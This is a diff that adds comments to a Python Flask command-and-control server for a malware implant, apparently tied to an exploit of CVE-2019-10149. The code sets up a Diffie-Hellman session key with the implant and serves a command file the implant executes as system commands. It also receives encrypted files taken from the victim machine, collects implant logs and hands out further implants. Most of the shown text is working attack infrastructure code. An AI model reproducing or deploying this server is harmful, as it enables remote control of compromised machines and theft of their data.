@@ -11,16 +11,18 @@ from cryptography.hazmat.primitives import serialization
 import os
 import base64
 import hashlib
-
+"""
+    NOTE 16 Bytes = 128 bits
+"""
 BLOCK_SIZE = 16
+
 # KEY = "your_secret_key_here"  # Replace with your actual key
 
-key_path = "../key.txt"
+key_path = "../key.txt" ## NOTE: Legacy code, likely not needed (see \key endpoint for more details)
 server_derived_key = None
 first_job = True
 
-
-
+## Generates the parameters for Diffe-Hellman Key exhange to be used for the session
 def generate_params():
     parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
     private_key = parameters.generate_private_key()
@@ -34,6 +36,7 @@ def generate_params():
 #         f.write((key))
 #     return (key)
 
+## Global key variable for session on C2, gets updated on new Diffe-Hellman Exchange
 KEY = None
 
 # function that does AES encryption and then obfuscation
@@ -48,6 +51,7 @@ def undo_everything(data):
     decrypted_data = aes_decrypt(deobfuscated_data, KEY)
     return decrypted_data
 
+## AES Encryption Implementation
 def aes_encrypt(plaintext, key):
     key_bytes = hashlib.sha256(key).digest()[:16]
     iv = os.urandom(BLOCK_SIZE)
@@ -62,6 +66,7 @@ def aes_encrypt(plaintext, key):
 
     return base64.b64encode(iv + encrypted).decode()
 
+## AES Decryption Implementation
 def aes_decrypt(ciphertext_b64, key):
     key_bytes = hashlib.sha256(key).digest()[:16]
     raw = base64.b64decode(ciphertext_b64)
@@ -101,17 +106,22 @@ def deobfuscate(obf_str):
 
 
 app = Flask(__name__)
-COMMAND_FILE = "command.txt"
+COMMAND_FILE = "command.txt"   ## Command file for implant to parse and execute commands
 
+## define parameters for shared key, have shared bytes to send to implant for implant to derive key
 parameters, private_key, public_key = generate_params()
 
+## Use to help implant derive shared key
 server_public_bytes = public_key.public_bytes(
     encoding=serialization.Encoding.PEM,
     format=serialization.PublicFormat.SubjectPublicKeyInfo
 )
 
-### KEY EXCHANGE RELATED STUFF
 
+"""
+   GET endpoint
+   This is how the implant gets the shared parameters the server to derive the session key.
+"""
 @app.route("/get_key_params", methods=["GET"])
 def get_key_params():
     ## Agree on paramaeters for key sharing
@@ -121,6 +131,10 @@ def get_key_params():
     )
     return byte_sized_params
 
+"""
+   POST endpoint
+   We ensure that the implant and the C2 share the same key for the .
+"""
 @app.route("/xchg_secrets", methods=["POST"])
 def xchg_secrets():
     ## Request client public key to derive server_key for session
@@ -143,9 +157,11 @@ def xchg_secrets():
     KEY = server_derived_key
     return server_public_bytes
 
-## KEY EXCHANGE RELATED STUFF
 
-
+"""
+   POST endpoint
+   We get uploaded encrypted data from the implant and place the decrypted file on our machine.
+"""
 @app.route('/upload', methods=['POST'])
 def upload():
     # Receive encrypted, obfuscated data from the implant.
@@ -178,6 +194,10 @@ def upload():
     else:
         return jsonify({"status": "no data received"}), 400
 
+"""
+   GET endpoint
+   We use a command file on the attacker machine to send commands to the implant. The implant recieves this file to parse and execute system commands.
+"""
 @app.route('/command', methods=['GET'])
 def get_command():
     try:
@@ -197,7 +217,10 @@ def get_command():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-
+"""
+    POST endpoint
+    The implant sends an encrypted log for the C2 to parse.
+"""
 @app.route('/log', methods=['POST'])
 def log():
     log_data = request.form.get('data')
@@ -207,15 +230,24 @@ def log():
         return jsonify({"status": "log received"}), 200
     else:
         return jsonify({"status": "no log data received"}), 400
-        
+
+"""
+    We can place additional implants or other files from our C2.
+"""
 @app.route("/utility")
 def serve_file():
     return send_from_directory("/home/kali/Desktop/CVE-2019-10149", "utility", as_attachment=True)
-    
+
+"""
+    NOTE: Legacy endpoint for testing purposes. This was before Diffe-Hellman implementation. Didn't remove as it can be useful for backup purposes and honestly was too scared if removing it breakings things'
+"""
 @app.route("/key")
 def serve_key():
     return send_from_directory("/home/kali/Desktop/CVE-2019-10149/C2Server", "cur_key.txt", as_attachment=True)
 
+"""
+    Helps coordinate multiple running processes and only lets the first process continue
+"""
 @app.route("/first")
 def check_first():
     global first_job
